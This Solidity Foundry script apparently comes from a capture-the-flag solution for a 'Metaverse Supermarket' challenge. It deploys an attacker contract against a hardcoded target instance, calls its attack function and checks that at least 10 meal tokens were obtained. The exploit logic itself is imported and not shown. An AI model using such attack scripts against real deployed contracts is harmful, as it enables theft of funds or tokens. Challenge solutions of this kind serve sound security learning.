// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/MetaverseSupermarket.sol";
import "../src/attackers/MetaverseSupermarketAttacker.sol";

contract MetaverseSupermarketScript is Script {
    address instanceAddress = 0x0C73164894a2170cF6E947c385300e8fb825AEd3; // Hardcoded, put your instance address plz
    InflaStore target;
    MetaverseSupermarketAttacker attacker;

    function setUp() public {
        target = InflaStore(instanceAddress);
        vm.label(address(target), "Target");
    }

    function run() public {
        vm.startBroadcast();

        attacker = new MetaverseSupermarketAttacker(instanceAddress);

        attacker.attack();

        require(target.meal().balanceOf(msg.sender) >= 10);

        vm.stopBroadcast();
    }
}
